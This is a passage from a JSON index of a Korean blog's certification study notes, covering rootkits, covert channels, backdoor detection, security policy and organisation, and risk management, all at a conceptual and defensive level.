중간에 이상한 출력이 나오는지 검토해 보아야 함           윈도우/유닉스의 정상적인 프로세스를 기억, 현재 실행중인 프로세스 확인                            윈도우 : Ctrl+Alt+Del 후 Windows 작업관리자 확인               자주 사용하는 프로세스 (윈도우)                                    csrss : Client/Server Runtime SubSystem                                            윈도우 콘솔 관리                       쓰레드의 생성, 삭제                       32비트의 가상 MS/DOS 지원                                                           svchost : Service Host - 30:44                                            dll (동적라이브러리) 파일로 실행되는 프로세스의 기본 프로세스                                                                                                                       백도어 탐지법                    소스코드 리뷰           HIDS 설치                            Host-based IDS (S/W)               백도어를 탐지하는 최선의 방법               백도어가 임의의 포트에 대기하고 있을 때 해당 포트를 탐지함                                   최초의 권한획득을 최소화 (허가 X)           지속적인 점검이 필요                           루트킷 (rootkit)            개요                    시스템 침입 후 침입 사실을 숨긴 채 차후의 침입을 위한 백도어                            트로이목마 설치, 원격접근, 내부 사용 흔적 삭제, 관리자 권한 획득 등 주로 불법적인 해킹에 사용되는 프로그램 모음                                   루트킷이 설치되면 자신이 뚫고 들어온 모든 경로를 바꾸어 놓고, 명령어들을 은폐해 놓음                            해커가 시스템을 원격으로 해킹하고 있어도 루트킷이 설치되어 있는지 사실조차 감지하기 어려움                                   침입자는 먼저 암호를 크래킹하거나 시스템 취약점을 찾아내어서 사용자용 접근 권한을 획득한 뒤, 컴퓨터에 루트킷을 설치함           루트의 권한을 쉽게 획득하게 돕는 도구, 자신을 은폐, 삭제할 수 없도록 함                            유저모드                                    Application (커널모드 함수호출 / 응답받기)                                               커널모드                                    원본코드 / 원데이터                                               루트킷은 User 모드의 Application, 커널모드의 원본코드, 원데이터를 공격 (경로 변형-Hooking)                                                   은닉채널            개요                    은닉채널 (Covert Channel) : 정보 전송이 목적이 아닌 채널           통신 채널은 은닉 채널과 공개 채널(Overt Channel) 로 구분됨.           은닉 채널은 다계층 보안 시스템(Multi-level Security System) 이 존재하는 경우 계층 간의 보안 허점을 이용하여 공개 채널의 사용자에게는 노출되지 않는 통신 채널을 구성함. 이러한 성격 때문에 디지털 워터마크나 디지털 서명 등에 사용되고 있음           악성코드 간의 통신 등에도 사용되기 때문에 은닉 채널의 탐지가 주요 이슈가 되고 있음           유사한 용어로 스테가노그래피(Steganography), 잠재적인 채널(Subliminal Channel) 등이 있음           은닉 채널의 모델은 The Prisoners’ Problem 모델이 사실상의 표준 모델(De-facto Model) 이 되었음           색출이 어려움                       컴퓨터 네트워크 프로토콜에서의 은닉 채널                    개요                            네트워크 트래픽에 대한 은닉 채널 형성 기법은 Open Systems Interconnection (OSI) 모델에서 데이터 링크 계층(4), 네트워크 계층과 전송 계층(5), 응용 계층(6)(7) 등 각 계층 별로 다양한 방법이 보고되고 있음. 컴퓨터 네트워크 프로토콜에서의 은닉 채널의 형성 기법을 분류하면 아래와 같음                                   사용하지 않는 헤더 비트                            프로토콜 명세 상에서 특정 값을 사용하도록 명시하지 않음               수신자가 값을 확인하지 않음               추후 사용하기 위해 예약해둔(Reserved) 영역을 이용                                   확장 기능 및 패딩                            많은 프로토콜들이 확장성을 고려해 헤더에 확장 기능(Extension Header) 을 정의하여 필요한 경우에 선택적으로 사용하고 있음               대부분의 헤더 확장 기능은 앞으로 추가될 기능을 충분히 고려하지 못하였기 때문에 보안에 잠재적인 위협이 될 수 있음                                   프로토콜 필드                            프로토콜 명세에 정의된 필드를 임의의 값으로 수정, 패킷의 전송에 직접적으로 관련이 있는 필드인 경우 예상치 못한 에러를 가져올 수 있음               패킷 전송 타이밍 : 전송된 패킷의 시간 간격이나 유실을 이용한 낮은 속도의 은닉 채널을 구성할 수 있음                                   터널링                            현 프로토콜(보통 IP프로토콜)을 다른 프로토콜로 전환하는 과정 중에 은닉 채널을 삽입할 수 있음. 이를 통해 방화벽 등의 보안 장비를 우회할 수 있음.                                               대응책                    HIDS           통신대역폭에 대한 엄격한 제한           정기적인 감사                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","접근통제 보안위협 및 대응책"],
        "url": "https://bluesplatter.com/is_certification/IS-Management-AccessControl_Threat/",
        "teaser": null
      },{
        "title": "정보보안 - 정보보호 정책 및 조직",
        "excerpt":"정보보호 정책 및 조직  정보보호 정책     정보보호 정책 수립의 중요성            정보화 사회, 지식기반사회 : 기업의 업무처리 정보 및 경영전략, 재무정보, 기밀자료등이 전자화된 형태로 정보시스템을 통해 처리       핵심 정보의 변조, 누출, 파괴로 인한 주요 업무의 중단, 대외 신뢰성의 훼손, 법적 금전적 손실의 위험       국방, 통신, 금융, 의료, 에너지, 정부행정 등 국가 주요정보통신기반시설에 대한 침해사고 발생 가능성                    정보통신기반보호법, 정보통신 기반시설에 대한 취약성 분석을 의무적으로 실시                       정보보호의 중요성 인식, 정보보호 투자도 증가하였으나 정보보호 수립, 관리하기 위한 방법에 대한 이해는 부족한 실정임                    정보보호를 기술적인 측면만으로 이해, 보안시스템 도입만으로 정보보호 문제를 해결할 수 있다고 믿음           정보보호 책임을 전산실의 실무자에게 일임하는 것                       정보보호는 기술적인 문제 뿌만 아니라 사람과 정보에 관한 경영상의 문제                    경영진이 책임을 지고 방향을 제시, 지속적으로 달성목표를 관리           경영진이 정보관리 실무자에게 정보보호에 대한 책임만을 지우고, 어떻게 보호할 것인지 방침을 제시하지 않고 정보보호를 위한 인적, 물적 자원의 지원없이 방침의 실행 여부를 정기적으로 검토하지 않음 &gt; 정보보호 목표 달성 불가                       경영진이 정보보호 정책의 수립에 참여해야 함                    경영진은 전반적인 목표와 방침을 모든 직원들에게 제시해야 함 &gt; 정보보호 정책           정보보호 정책을 달성하기 위해 무엇을 어떻게 해야 할지 계획하고 구현하는 것은 실무자의 책임                           정보보호 정책이란?            경영진의 정보보호에 관한 목표와 방향을 제시       기업 또는 조직의 정보보호에 대한 방향, 전략 그리고 주요 내용들을 문서화시켜 놓은 것       정보보호관리를 위해 가장 먼저하는 정책수립에 해당하는 결과물       포함되어야 할 사항들                    정책의 범위와 목적, 법적/규정적 의무사항과의 관계           자산의 분류           비인가자의 접근 원칙           기밀성, 무결성, 가용성, 책임추적성 보장           법 준거성           개발 및 유지방법           비상대책 계획 수립 : 연속성 및 업무연속성계획(BCP)           교육 및 훈련 / 징계와 처벌           보안사고 보고 및 조사           기타 관련 정책                       정책의 역할                    임직원 책임 할당 / 책임 추적성 제공           임직원 가치판단의 기준           모든 직원에게 경영진의 목표 공유           기업의 비밀, 지적재산권 보호           기업의 컴퓨팅 자원 낭비 방지                       정보보호 정책의 구분, 정의 및 특성                    정책 (Policy)                            정보보호에 대한 상위 수준의 목표 및 방향을 제시               조직의 경영목표를 반영하고 정보보호 관련 상위 정책과 일관성을 유지               정보보호를 위해 관련된 모든 사람이 반드시 지켜야 할 요구사항을 전반적이며 개략적으로 규정                                   표준 (Standard)                            정보보호 정책과 마찬가지로 반드시 지켜야하는 요구사항에 대한 규정이지만, 정책의 만족을 위해 반드시 준수해야 할 구체적인 사항이나 양식을 규정               조직의 환경 또는 요구사항에 따라 관련된 모든 사용자들이 준수하도록 요구되는 규정                                   지침 (Guidelines)                            반드시 지켜야 하는 것이 아니라 선택 가능하거나 권고적인 내용이며 융통성있게 적용할수 있는 사항을 설명               정보보호 정책에 따라 특정 시스템 또는 특정 분야별로 정보보호 활동에 필요하거나 도움이 되는 세부 정보를 설명                                   절차 (Procedures)                            정책을 만족하기 위하여 수행하여야 하는 사항을 순서에 따라 단계적으로 설명               정보보호 활동의 구체적 적용을 위해 필요한 적용 절차 등의 구체적이고 세부적인 방법을 기술                                               정보보호 정책 개발의 원칙                    개인적 측면 : 개인의 프라이버시가 침해되지 말아야 하며, 정보보호의 목적을 달성하기 위하여 IT부서 또는 정보보호 담당자의 편의 중심으로 개발되어서는 안된다.           사회적 측면 : 도덕적 판단기준, 사회적 측면에서 일반적이고 보편타당하여야 한다.           법률적인 측면 : 다른 사람의 법적인 권리를 보장할 수 있는 바탕에서 개발되어야 하며, 정보보호의 법률 및 규제 등의 요구사항이 반영되어야 한다.                           정보보호 정책 요소            경영진의 참여와 지원       법적 요구사항 처리(관계 법령 고려)       상위 정책과의 일관성 유지       정보보호 구성 체계           정보보호 정책 개발 절차            준비                    참조문서 수집 및 요구분석 : 관련 참조문서의 수집, 요구사항 수렴, 경영목표 관련 자료, 기존 정책서 등                            경영목표정보 / 정보전략계획(ISP)               최근 위험평가자료               전체 조직구성도               정보시스템 아키텍처 문서               정보보안 아키텍처 문서               최근 침해사고 기록 및 장애 대응 정보               내부/외부 감사결과                                   정책의 구조 결정 : 정책의 내용, 서술방식, 우선순위 및 대상의 정의                       작성 및 검토                    정책 초안 작성 : 정보보호 정책서의 초안 작성           검토 및 조정 : 정책의 주요 적용 대상자를 대상으로 적합성 및 실행가능성 검토 및 조정                       승인                    경영진의 검토 및 승인 : 경영진의 검토 및 이행에 대한 지원을 약속                            정보보호위원회에서 최종 검토 및 승인이 바람직함               임시적인 정책 개발 검토위원회 (경영진 참여) 를 구성해서 승인할 수도 있음                                                   정보보호조직     정보보호조직 구성 시 고려사항            정보보호에 관련된 역할과 책임을 명확히 정의       정보보호 책임자를 지정                    책임을 할당받은 경영진 또는 관리자들은 정보보호 업무를 위임할 수 있으나 최종책임은 여전히 그들에게 남아있음.           위임한 업무가 모두 올바르게 수행되었는지 확인해야함           대부분이 정보보호 관리자 및 실무자를 지정하여 실제 업무를 수행함           각 부서의 정보보호에 대한 책임은 각 부서의 관리자들에게 남아있음                            각 자산에 대해 소유자를 지정하고 그 자산의 보호 책임을 지도록 해야 한다.               자산의 소유자는 정보보호 관리자와 협력하여 자산의 보호방법을 결정, 방법을 구현하기 위한 자원 조달을 해야 한다.                                                   정보보호 조직체계 구성 시 고려해야 할 사항            조직의 규모(크기 및 인력), 조직 관리구조, 운영사이트의 수와 위치, 사이트간 상호 연결형태, 정보화 및 IT 예산, 시스템 운영환경 등을 고려       보호해야 할 정보자산의 유형, 규모 및 가치 등을 고려 (자산식별) 하여 이에 적합한 수준으로 인원과 예산을 배정해야 함       조직의 모든 부서에서 해당 업무 수행에 필요한 정보보호책임이 할당되어야 함.                    정보보호 전담조직은 이를 기획, 조정, 통합하고 이행을 모니터링하며 정보보호 사고 등 위반에 대응하는 역할을 수행                       정보보호 전담 인력이 아닌 일반 직원이라 하더라도 업무 수행 과정에서 정보를 보호할 책임이 있음       직무분리의 원칙을 적용해야 함.       적정 인력 확보가 어려운 경우 외부 전문업체에 위탁할 수 있으나, 책임을 져야 하는 정보보호책임자, 정보보호관리자는 내부인력으로 임명해야 함. 실무를 수행하는 정보보호담당자는 외부 인력을 활용할 수 있다.       외부 전문업체 인력 활용 시 해당인력의 책임 및 역할, 자격요건 등을 문서화하고 계약인력과 수행인력이 실제 일치하는지에 대해서도 확인 필요           정보보호 책임 할당            정보보호위원회 구성 : 전 조직에 걸친 정보보호 의사결정을 위해 모든 부서의 임원진 등 경영층이 참여       보안담당자 지정 : 각 부서별로 정보보호 활동 지원       정보보호 실무협의회 구성 : 정보보호 실무의 구체적인 사항을 협의       조직구성도                    CEO - 정보보호책임자 - 정보보호관리자 / 각부서 팀장 - 정보보호담당자                            (정보보호책임자 - 정보보호관리자 / 각부서 팀장) : 보안심의위원회               (정보보호관리자 - 정보보호담당자 / 각부서 담당자) : 보안실무위원회                                                   정보보호위원회            정보보호관리체계의 효과적인 운영을 위해 정보보호 관련 사안에 대한 심의 책임을 갖는 기구(위원회)를 구성해야 함.       일반적으로 정보보호책임자를 위원장으로 함. 정보보호에 관련된 각 부서의 장을 위원으로 함. 정보보호 관리자가 간사 역할.       주요 정보보호 관련 사안에 대한 검토와 승인이 가능하다고 판단되는 인원을 포함       정보보호위원회 구성 및 정기 운영에 관한 사항을 별도 규정으로 수립하여 적용할 수 있음.       정보보호위원회에서는 아래와 같은 주요 정보보호 활동을 심의/의결할 수 있으며, 의사결정 기록을 남겨야 함.                    정보보호정책의 심의 및 승인           정보보호 활동 계획의 심의 및 승인           정보보호 예산 심의 및 승인           보안사고의 심의, 위규자 징계, 우수자 포상 심의 및 승인           위험평가 결과 검토 및 승인           정보통신망 신. 증설에 따른 자체 보안성 검토           정보보호 관련 장비 및 프로그램 도입 검토           정보보호 정책 및 지침의 재/개정에 관한 사항           연간 정보보호계획 수립과 집행에 관한 사항           내부감사 실시 및 결과에 관한 사항           기타 의장 또는 정보보호책임자가 필요하다고 인정하는 사항                           정보보호실무협의회            정보보호위원회 심의/의결사항에 대한 실무적인 검토, 세부 이행방안 수립, 원할한 정보보호 관리활동의 조정 등의 업무를 수행       정보보호실무협의회는 정보보호관리자가 주관하고, 정보보호담당자가 간사 역할을 수행, 다루는 사안에 따라 관련 부서의 정보보호담당자가 참여       정보보호에 관련하여 부서간 협의가 필요한 사항이 발생하는 경우 수시로 협의회를 소집할 수 있음       정보보호위원회의 의사결정을 지원하기 위하여 아래와 같은 구체적인 사항을 협의함                    정보보호 정책 및 지침 안 작성 및 검토           정보보호 활동 계획안 수립           정보보호 예산안 수립           위험평가 수행, 위험평가 결과의 실무 검토 및 해결 방안 협의           정보통신망 신/증설에 따른 자체 보안 방안           분야별 정보보호대책의 수립과 집행에 관한 사항           자산에 대한 위험분석 평가에 관한 사항           내부감사 지원, 그 결과의 실무 검토 및 해결 방안 협의           기타 정보보호 관리자 및 부서별 정보보호 담당자가 요청하는 사항                           정보보호 전담 조직            정보보호팀                    정보보호 관련 업무를 기획하고 시행하기 위한 세부계획을 마련, 각종 보안통제 사항을 관리           자산에 대한 위협 및 위험분석, 주기적인 모니터링을 통해 평시 정보보호 관리를 이행           조직 임직원의 정보보호에 대한 인식 및 기술 수준을 제고하기 위해 교육 계획을 수립하고 시행           주요 시스템에 대한 침해사고 등 긴급 상황에 대처하기 위한 비상계획의 수립과 운영을 지원                       침해사고대응팀 (CERT : Computer Emergency Response Team)                    정보통신망의 침해사고 등 사이버 침해로부터의 예방, 대응, 분석 및 복구 등의 활동 수행           비상시 조직으로서 침해사고를 비롯한 정보보호 사고가 발생할 경우, 신속하고 효과적인 사고처리 및 복구를 위해 주요 정보보호담당자를 중심으로 침해사고 대응팀을 구성하여 운영한다.           정보보호책임자는 침해사고에 즉각적으로 대응하기 위하여 사전 조직 구성, 대응 절차 및 예방책 수립, 사고 대비 교육 및 훈련 등을 실시하여야 한다.           침해사고는 다양한 방식으로 발생할 수 있으므로 일반 직원이 침해사고를 인지하고 신고하기 위한 교육 훈련을 포함해야 한다.                       개인정보보호팀                    개인정보를 취급하는 조직에서는 관련 법에 따라 개인정보보호책임자(CPO:Chief Privacy Officer)를 임명해야 함                            CPO 는 개인정보의 취급 및 보호에 관한 총괄책임을 진다.               필요한 실무 이행을 위해 개인정보관리자 또는 담당자를 지정하여 업무를 위임한다.               개인정보보호 책임자는 개인정보취급자 및 부서별 개인정보 보유현황 및 업무를 파악하고 개인정보의 전체 수명주기에 걸쳐 법적 요건을 만족하기 위한 취급방침 및 방침의 이행을 위한 프로세스를 수립하고 관리하여야 함.                                   개인정보보호책임자는 임원급 이상의 실무에 능통한 사람을 임명하는 것이 필요함.           실제 개인정보를 관리하는 부서의 장이 개인정보보호책임자를 맡고 전담하는 실무자 또는 전담 부서를 두는 것이 좋음           개인정보보호책임자의 업무                            개인정보 보호 계획의 수립 및 시행               개인정보 처리 실태 및 관행의 정기적인 조사 및 개선               개인정보 처리와 관련한 불만의 처리 및 피해 구제               개인정보 유출 및 오/남용 방지를 위한 내부통제시스템의 구축               개인정보 보호 교육 계획의 수립 및 시행               개인정보파일의 보호 및 관리/감독               개인정보취급자에 대한 감독 및 정기적인 보안 교육               위탁업체의 개인정보 관리 상황에 대한 관리 감독               이용자의 불만사항 접수 및 처리               그 밖에 개인정보의 적절한 처리를 위하여 별도로 정한 사항                                               보안감사팀                    정보보호방침 혹은 정책에 따라 보안활동이 적절히 이루어지고 있는지를 호가인           보안감사는 감사 주체에 따라 내부감사와 외부감사로 구분           감사시기에 따라 정기 보안감사와 수시 보안감사로 나뉨. 정기 보안감사는 연간 1회 이상 실시           보안감사 수행을 위한 정책과 적용 기준이 명확하게 수립되어야 함 (지나친 감사는 업무에 부담, 자원 낭비)           다음 사항을 포함하는 보안감사계획을 수립                            감사대상 및 영역               감사목적               감사범위 및 중점감사항목               감사일정(기간)               참여 감사자               감사기법 및 감시기준               기타 필요사항 등                                                   담당자의 역할            정보보호책임자                    조직의 정보보호 총괄 책임자로서 정보보호의 필요성과 목표에 대한 명확한 인식을 가져야 함           효과적인 정보보호 업무 이행을 위해서 임원급에서 지정되어야 함           정보보호책임자는 조직의 전반적인 정보보호 관련 업무에 대한 총괄책임을 가지고 의사결정을 내리며 업무이행을 관장하고 준수여부를 감독함           정보보호책임자는 정보보호위원회의 의장 역할을 수행하며 주요 업무는 다음과 같음                            정보보호정책의 수립 및 이행               정보보호조직의 구성 및 운영               정보보호 정책 및 지침의 승인/승인 획득               정보보호 활동 및 교육 지휘, 감독               정보보호 예산 편성 및 집행               정보보호 대책의 수립               침해사고대응팀 수립 및 운영               정보보호 관련 법, 규정 검토 준수               정보보호 현황을 최고경영진에게 정기적으로 보고               기타 정보보호 관련 업무 지휘 감독                                               정보보호관리자                    정보보호관리자는 정보보호책임자의 임무를 위임받아 정보보호 업무를 수행하는 인력을 말함           정보보호 전담조직의 관리자로서 다음과 같은 업무를 수행함                            정보보호 업무 기획 및 정보보호 활동 실무 조정               정보보호 정책 및 지침의 수립, 주기적인 검토 및 개정               정보보호 계획 수립               정보보호 정책 및 지침 준수에 대한 지원 및 관리 감독               조직 구성원에 대한 정보보호 교육 및 홍보               침해사고 대응체계 수립 및 대응               정보보호 감사 계획 수립 및 이행               정보보호시스템의 도입 계획 수립 및 운영관리               비상대책 및 재난대책 등을 포함한 정보보호 대책 수립               정보보호책임자를 보좌               정보보호 현황의 정기적인 모니터링               정보보호 현황을 정보보호책임자에게 정기적 또는 비정기적으로 보고                                               정보보호담당자                    조직에서 정보보호 실무 운영을 담당하는 자           정보보호관리자의 지시에 따라 일반적으로 다음과 같은 역할 수행                            정보보호시스템의 운용 및 유지관리               인프라, 응용프로그램, 데이터베이스 및 PC 의 보안관리               정보보호 점검 및 감사 수행               보안 모니터링               침해사고 등 비상상황시 대응               기타 정보보호관리자의 업무 보조                                               정보통신 분야별 담당자                    서버, 네트워크, 응용시스템, 데이터베이스 등에 관련된 실무를 담당하는 인력           담당 정보자산의 보안을 관리하고 자체점검을 실시하며 보안사고 처리를 지원함           시스템(서버 운영)담당자, 네트워크 담당자, 보안시스템 담당자, 데이터베이스 담당자, 시스템 개발 담당자, 전산실 담당자가 포함되며 다음과 같은 정보보호 역할을 수행                            서버 등 주요 시스템에 대한 정보보호 점검 및 통제               네트워크에 대한 정보보호 점검 및 통제               어플리케이션 등 주요 응용시스템에 대한 정보보호 점검 및 통제               데이터베이스관리시스템(DBMS)에 대한 정보보호 점검 및 통제               개인용컴퓨터(PC), 이동형 저장장치 등에 대한 정보보호 점검 및 통제                                               비정보통신 업무부서별 정보보호담당자                    업무 부서 별 정보보호 책임은 해당 부서장에게 있음           업무별 정보보호담당자는 부서장의 지휘를 받아 해당 부서의 정보보호 실무를 이행함           조직의 정보보호 정책 준수를 위해 필요한 실무를 이행하며 해당 부서의 정보보호 관련 의견수렴 및 전달을 위한 채널로써 정보보호 전담조직과 협력하여 다음과 같은 업무를 수행함                            부서 내 주요 정보보호 활동에 대한 기획 및 이행               부서 내 정보보호에 대한 의견 수렴 및 정보보호부서에 전달, 협의               부서 내 정보보호 현황 점검 및 보고               부서 내 보안사고 발생시 정보보호 전담조직(부서)와 협력하여 이를 처리                                                  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","정보보호 정책","정보보호 조직"],
        "url": "https://bluesplatter.com/is_certification/IS-Management-Security_Policy_and_Organization/",
        "teaser": null
      },{
        "title": "정보보안 - 위험관리",
        "excerpt":"위험 관리(Risk Management)     위험 관리는 프로젝트 추진 과정에서 예상되는 각종 돌발 상황(위험) 을 미리 예상하고 이에 대한 적절한 대책을 수립하는 일련의 활동이다.            위험은 불확실성과 손실을 내재하고 있는데, 위험 관리는 이러한 위험의 불확실성을 감소시키고 손실에 대비하는 작업이다.       위험을 식별한 후 발생 확률을 산정하고, 그 영향을 추산하여 해당 위험에 대비하는 비상 계획을 마련한다.                    조직의 자산에 대한 식별을 통해 자산가치를 판별하고, 가치에 따라 보안대책을 수립           조직의 자산에 대한 위험감수수준                            예:자산 가치 3억에 5억의 비용을 들여 보호하는 것은 넌센스다.                                               주기적, 반복적으로 위험 관리를 하여야 함.           세부과정            전략/계획 수립       위험 요소 분석       위험평가 : 위험에 대한 규모를 규정       정보보호대책 선정 : 위험완화       대응책 구현                    위험관리에 위험분석이 80% 비율, 위험관리, 위험분석, 위험평가를 비슷한 의미로 사용하기도 함                           위험 관리는 프로젝트 추진 과정에서 예상되는 각종 돌발 상황(위험) 을 미리 예상하고 이에 대한 적절한 대책(위험 완화)을 수립하는 일련의 활동            위험은 불확실성과 손실을 내재하고 있는데, 위험 관리는 이러한 위험의 불확실성을 감소시키고 손실에 대비하는 작업       위험을 식별(위험 요소 분석)한 후 발생 확률을 산정(위험평가)하고, 그 영향을 추산(위험평가-위험의 규모를 결정)하여 해당 위험에 대비하는 비상 계획을 마련함                    위험분석 없이 보호대책을 수립하는 경우                            취약점이 너무 많아짐               위협에 대한 우선순위가 설정되지 않음 : 과도한 투자가 이루어질 수 있음                                                   위험 분석     위험 관리의 핵심 (80% 이상)   정보시스템과 조직의 위험을 측정하고 허용여부의 판단근거를 마련하는 과정   위험 분석 방법 : 기준 접근법(베이스라인 접근법), 세부위험분석(상세위험분석), 복합접근법, 비정형접근법 (ISO/IEC 13335-1)   위험 (Risk) : 원하지 않는 사건이 발생하여 손실이나 부정적 영향을 미칠 가능성            위험 : 발생가능성 x 손실           위험의 구성요소            자산 (Assets) : 조직이 보호해야 할 대상 (무형자산도 포함)                    정보, H/W, S/W, 시설, 인력, 기업이미지, 평판, 직원들의 사기           자산 유형에 따라 취약성이 분류됨 (예: 문서는 해킹에 대한 취약점이 없음)                            자산의 분류 및 파악이 위험을 평가하는데 중요함                                    보안사고 발생시 손실 (loss) 에 대한 파악이 되어야 함                   양적으로 손실 측정이 가능 -&gt; 보호대책의 비용과 보안사고시 손실간 균형을 맞추는데 활용                   자산평가(가치) 의 필요성 : 구체적인 금액, 자산 손상시 미치는 피해의 정도                                            취약성 파악의 필요성                       자산 관련 비용 (구회비용, 기회비용, 복구비용, 침해시 보상비용 포함)                                                                                                                       위협 (Threat) :  자산의 손실을 초래할 수 있는 윈치 않는(돌발적인) 사건의 잠재적 원인, 잠재적 행위자                    위협의 원천                            환경적 요인                                    장비고장, 자연재해                                               인간에 의한 요인                                    의도적 위협, 우연한 위협                                                                   위협 발생이 반드시 피해가 발생함을 의미하는 것은 아님                            자산의 취약성을 이용하는 것이 위협 (원치 않는 사건의 원인)                                    자산의 취약성에 대한 보호대책이 있으면 위협의 결과(피해) 가 달라짐                   위협 발생 가능성 : 해킹시도                   위협 성공 가능성 : 해킹성공                                                                               취약성 (Vulnerability)                    자산의 잠재적 속성           자산과 위협 사이의 관계를 맺어주는 특성           위협의 이용 대상           정보보호대책의 미비                       정보보호대책 (대응책) (Safeguard, Countermeasure)                    위협에 대응하여 자산을 보호하기 위한 관리적, 기술적 대책           관리적 대책 : 절차, 정책, 교육           기술적 대책 : IDS, Firewall           보호대책의 효과를 파악하여 보호대책을 선정해야 함                            모든 위험을 완전히 제거할 수 없음                                               위험 = f(자산, 위협, 취약점)       전체위험(Total Risk) = 자산 * 위협 * 취약성       잔여위험(Residual Risk) = (위협 * 자산 * 취약점) * 통제격차 (Controls Gap)                    통제격차 : 비용효율성, 조직에 대한 안전장치의 가치 (대응책 시행 전에 잔여위험을 파악하기 위함)           잔여위험 : 전체위험 - 대응책                           위험 분석의 절차            위험관리                    범위결정           위험분석 (80% 이상 차지)                            자산식별               자산가치평가 / 위협평가 / 기존 보안대책 평가 / 취약성 평가               위험평가                                   대책선택 (제약조건을 고려)           위험수용여부 결정                            Yes : 보안정책 -&gt; 보안계획수립               No : 대책선택으로 회귀 (다른 대책을 선택)                                   IT 시스템 보안정책 수립           IT 보안계획 수립                           위험 분석의 유형            기준선접근법 (Baseline-approach)                    체크리스트 (모든 시스템에 대한 표준화된 보안대책의 Set) 를 이용           BS7799 ISO-17799 를 사용한 Gap 분석           장점 : 분석 비용, 시간을 매우 절약할 수 있음           단점 : 과보호 또는 과부족 보호가 될 가능성이 존재                            조직에 적합한 체크리스트여야 함                                   소규모 조직에 사용되도록 권고                       비정형 접근법 (Informal approach)                    구조화된 (정형화된) 방법론에 기반하지 않고 경험자의 지식과 전문성을 활용하여 실용적 위험분석 실시           중소규모조직에 적합           전문가 의존형 접근법 (내부 전문가, 외부 보안 컨설턴트)           장점 : 위험분석이 빠름, 비용 절감, 조직내 시스템에 대해서 구체적 위험과 취약성 평가가 가능, 정교한 목표지향적인 대책, 통제수단 제시           단점 : 일부 위험이 적절하게 평가되지 않을 수 있음. 개인의 주관적 판단에 의한 것이기 때문에 대책에 대한 정당성 결여, 결과왜곡이 될 수 있음. 일관성 없는 평가                       상세 위험 분석 (Detailed Risk Analysis)                    시간과 노력이 많이 소요됨 (비용 많이 발생, 대책 구현시 지연이 발생할 수 있음)           고급 인적 자원이 필요           가장 포괄적인 접근법 (정형화, 구조화된 프로세스 사용)           모든 중요한 위험이 식별 (가장 상세한 분석 - 계량적 수치화, 평가의 완전도가 높음)           보안환경 변화에 적절히 대처할 수 있음                       복합 접근법 (통합된 접근법, Combined Approach)                    기준선접근법, 비정현접근법, 상세위험분석접근을 상황에 맞게 복합적으로 적용           예 : 고위험 영역을 식별하여 상세위험 분석, 다른 영역은 기준선접근법을 사용                           상세 위험 분석            위험 분석의 절차와 동일                    자산 분석                            주요자산 유형별 분류, 목록 생성 (위험 분석 결과 정확도와 연관)               기밀성, 무결성, 가용성 평가               자산의 가치 평가                                   위협 분석                            위협 : 자산에 피해를 가할 수 있는 잠재적 요인               위협을 파악, 발생 가능성을 분석 (위험산출에 있어서 중요한 단계)                                    자산, 취약성 (위협이 취약성을 공격) 간의 관계를 정의                                            향후 위협이 미칠 대상을 고려할 수 있음                                                                                       위협의 발생가능성은 정확히 평가할 수 없음 / 검증할 수 없음                                    추론하는 것은 자산의 특성과 위험을 이해하는 것에 도움을 줌                                                                   취약점 분석                            존재하는 모든 취약점을 나열하는 것은 불가능함               자산분석을 통해 도출된 자산의 중요도, 속성을 바탕으로 자산이 갖고있는 취약점을 식별할 수 있음               자산분석, 위협분석, 취약점 분석을 통해 파악한 위험을 Original Risk 라고 함                                   대응책 분석                            대응책 : 취약성을 낮추거나 피해규모 감소, 위협 발생 가능성을 낮추는 것                                   위험 평가  : 위험분석의 최종 단계                            자산, 위협, 취약점, 대응책의 분석을 통해 도출한 분석결과 데이터를 이용해 위험을 측정, 평가 =&gt; 대응책 제시               보안대책 수립을 위해 시스템 및 그 자산의 노출위험을 평가하고 식별하는 단계               피해의 크기와 발생 가능성을 고려               위험 평가 과정                                    정량적 위험평가(분석)                                            손실의 크기나 위험의 크기를 금액(숫자값)으로 표기                       연간 예상(기대) 손실액 (Annual Loss Expectancy) 계산을 위해서 관련된 모든 값들을 정량화                                                    ALE = SLE * ARO                           SLE (Single Loss Expectancy) : 어떠한 위협이 성공했을 때 예상 손실액                                                            자산가치 * 노출계수                                                                                   ARO (Annual Rate of Occurrence)                                                                                                           정성적 위험평가(분석)                                            손실의 크기와 위험의 크기를 개략적으로 비교                       화재 위험이 높다                       Very High, High, Medium, Low..                                                                                       정량적 위험 분석 종류                                    과거자료분석법                                            과거자료를 통해서 미래 예측                       빅데이터 활용                       정확성이 높음                                                           수학공식접근법                                            과거자료의 획득이 어려울 경우                       발생 빈도를 추정하는 계산식을 활용                       기대손실을 추정하는 자료의 양이 적음                                                           확률분포법                                            정확성이 낮음 (확률적 편차 활용)                       미지의 사건을 추정                                                           점수법                                            각 위험 발생 요인에 대해 가중치를 둠                       분석시간이 짧고, 분석해야할 자원의 양이 적음 -&gt; 정확성이 낮음                                                                                       정성적 위험 분석의 종류                                    델파이법                                            전문가 취약점 토론 방법                       정확도가 낮음                                                           시나리오법                                            어떠한 사건도 기대대로 발생하지 않는다는 사실에 근거하여 추정                       정확도, 완성도가 낮음                                                           순위결정법                                            각각의 위협을 비교하여 순위를 매김                       정확도가 낮음                                                           퍼지행렬법                                            정성적 위험 분석의 종류임에도 불구하고 수학적으로 계산하는 방법                       정성적 언어로 표현된 값을 수학적 방법을 이용하여 표현                       자산 가치 - 크고 적음을 화폐의 가치로 표현                       위협의 발생확률 - 높고 낮음을 변수로 표현                                                                                                           잔류위험 평가                            위험 분석 결과에 대한 종합적 평가를 내리기 전에 검증하는 단계                                                   위험 처리 방법            위험 회피 (Avoidance)                    위험이 존재하는 프로세스 또는 사업을 포기                       위험 이전 (Transfer)                    위험 전가, 외주나 보험을 활용하여 잠재적 비용을 제3자에게 이전하거나 할당하는 것                       위험 수용 (Acceptance)                    위험을 일정수준 감수하고 일정정도 이용                       위험 감소 (Reduction)                    위험 축소           위험 결과를 감소시킬 수 있는 대책을 채택하여 구현                            예) 자료백업 프로세스 확립, 재난복구계획 개발, 이중화                                   위험 발생 가능성을 감소시킬 수 있는 대책을 채택하여 구현                            예) 통제수단 마련 (방화벽, 인증수단 등)                                   감소되는 위험의 크기와 대책에 드는 비용을 비교하여 대책을 선택한다.                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","위험 관리"],
        "url": "https://bluesplatter.com/is_certification/IS-Management-Risk_Management/",
        "teaser": null
      },{
        "title": "정보보안 - BCP / DRP",
